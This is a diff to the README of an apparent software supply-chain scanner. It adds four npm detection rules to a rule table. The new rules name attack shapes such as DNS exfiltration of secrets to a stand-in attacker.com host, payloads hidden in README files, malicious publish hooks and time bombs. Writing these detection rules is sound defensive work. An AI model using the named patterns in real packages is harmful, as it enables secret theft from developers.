@@ -20,7 +20,7 @@ See [plan.md](plan.md) for the design rationale and
 
 ✅ Working end-to-end for npm + cargo + PyPI + NuGet:
 
-- Stage 1 deterministic rules (32 rules)
+- Stage 1 deterministic rules (36 rules)
 - Stage 2 LLM adjudicator with fail-open semantics
 - Content-addressed R2 catalog layout (writes to filesystem;
   `rclone`/`aws s3 sync` to R2)
@@ -173,6 +173,10 @@ immediate **block** verdict; everything else defers to Stage 2.
 | `NPM023`   | High     | defer     | Install-time outbound HTTP/fetch (`https.get` / `axios.get` / …) |
 | **`NPM022`** \* | Critical/High | bidi=yes / zw=defer | Trojan Source bidi override / zero-width / mixed-script identifier |
 | **`NPM024`** \* | Critical | yes       | Crypto-miner indicators (`stratum+tcp://`, known pools, CoinHive, XMR addr) |
+| **`NPM025`** | High | defer | DNS exfil: `dns.lookup(secret + '.attacker.com')` shape |
+| **`NPM026`** | Critical | yes | Executable payload smuggled into README / LICENSE / CHANGELOG |
+| **`NPM027`** | Medium | defer | publish-time hook (`prepublishOnly` etc) contains network/shell — possible CI compromise |
+| **`NPM028`** | High/Med | defer | Time-bomb activation — `Date.now() > <future epoch>` or literal future date |
 | `CARGO001` | Info     | no        | `build.rs` present |
 | `CARGO002` | High     | defer     | build.rs uses `Command::new` etc. |
 | **`CARGO003`** | High | defer     | Crate is a proc-macro (compile-time code in every downstream crate) |
